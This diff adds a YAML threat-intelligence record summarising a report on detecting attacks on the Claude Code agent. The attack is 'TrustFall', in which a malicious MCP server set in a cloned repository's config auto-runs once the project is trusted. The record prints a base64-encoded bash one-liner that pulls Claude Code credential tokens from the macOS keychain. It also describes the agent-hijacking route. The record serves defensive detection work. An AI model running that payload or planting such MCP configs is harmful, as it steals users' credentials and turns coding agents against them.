@@ -1,0 +1,96 @@
+title: 'Claude Code and Cowork in the SOC: Visibility, Detection, and the Wild West
+  of AI Agent Logging'
+description: This report covers detection engineering for Claude Code using OpenTelemetry
+  logs, focusing on the TrustFall attack pattern where malicious MCP servers execute
+  encoded payloads to dump credentials, and describes correlation rules, pipeline
+  filtering, and PII redaction techniques.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - bash
+  - claude
+  - /bin/sh
+  - claude.exe
+  - node
+  - node.exe
+  - bun
+  - bun.exe
+  - pwsh
+  - pwsh.exe
+  - powershell.exe
+  - sh
+  - zsh
+  - bash.exe
+  command_lines:
+  - bash -c "echo 'c2VjdXJpdHkgZmluZC1nZW5lcmljLXBhc3N3b3JkIC1zICJDbGF1ZGUgQ29kZS1jcmVkZW50aWFscyIgLXcgMj4vZGV2L251bGwgfCBlZ3JlcCAtbyAnc2stYW50LW9hdFteIl0rJw=='
+    | base64 -d | bash"
+  - /bin/launchctl setenv OTEL_RESOURCE_ATTRIBUTES "host.name=$(/bin/hostname -s)"
+  powershell: []
+  scripts:
+  - echo 'c2VjdXJpdHkgZmluZC1nZW5lcmljLXBhc3N3b3JkIC1zICJDbGF1ZGUgQ29kZS1jcmVkZW50aWFscyIgLXcgMj4vZGV2L251bGwgfCBlZ3JlcCAtbyAnc2stYW50LW9hdFteIl0rJw=='
+    | base64 -d | bash
+  - export OTEL_RESOURCE_ATTRIBUTES="host.name=$(/bin/hostname -s)"
+  registry_keys:
+  - HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+  image_loads: []
+  network_connections:
+  - claude -> poc-server:stdio
+  file_activity:
+  - .mcp.json
+  - .claude/settings.json
+  - .claude/settings.local.json
+  - /Library/LaunchAgents/com.example.claude-otel-resource.plist
+  - /etc/passwd
+  - /etc/profile.d/
+  - /private/tmp/trustfall-demo
+  persistence:
+  - LaunchAgent plist at /Library/LaunchAgents/com.example.claude-otel-resource.plist
+    sets OTEL_RESOURCE_ATTRIBUTES via launchctl setenv at login
+  - Malicious MCP server defined in .mcp.json with auto-approval via .claude/settings.json
+    executes arbitrary code on project trust acceptance
+  - macOS LaunchAgent plist at /Library/LaunchAgents/com.example.claude-otel-resource.plist
+    sets OTEL_RESOURCE_ATTRIBUTES env var at login via launchctl setenv
+  - Linux /etc/profile.d/ script exports OTEL_RESOURCE_ATTRIBUTES="host.name=$(/bin/hostname
+    -s)" at login
+  - Windows registry entry HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+    sets OTEL_RESOURCE_ATTRIBUTES with value host.name=%COMPUTERNAME% and type REG_EXPAND_SZ
+  - Malicious MCP server embedded in cloned repository project-scope settings to auto-approve
+    on project trust dialog acceptance
+  process_relations:
+  - claude -> bash
+  - Claude Code -> bash
+  - Claude Code -> /bin/sh
+  - claude -> node
+  - claude -> node.exe
+  - claude -> bun
+  - claude -> bun.exe
+  - claude -> pwsh
+  - claude -> pwsh.exe
+  - claude -> powershell.exe
+  - claude -> sh
+  - claude -> zsh
+  - claude -> bash.exe
+  - claude.exe -> node
+  - claude.exe -> node.exe
+  - claude.exe -> bun
+  - claude.exe -> bun.exe
+  - claude.exe -> pwsh
+  - claude.exe -> pwsh.exe
+  - claude.exe -> powershell.exe
+  - claude.exe -> sh
+  - claude.exe -> zsh
+  - claude.exe -> bash
+  - claude.exe -> bash.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - adversa.ai
+  urls:
+  - hxxps://adversa[.]ai/blog/trustfall-coding-agent-security-flaw-rce-claude-cursor-gemini-cli-copilot
+authors: []
+reference: https://www.abstract.security/blog/claude-code-cowork-monitoring-for-threat-detection
+date_of_publication: May 22, 2026
+file_creation_date: May 22, 2026
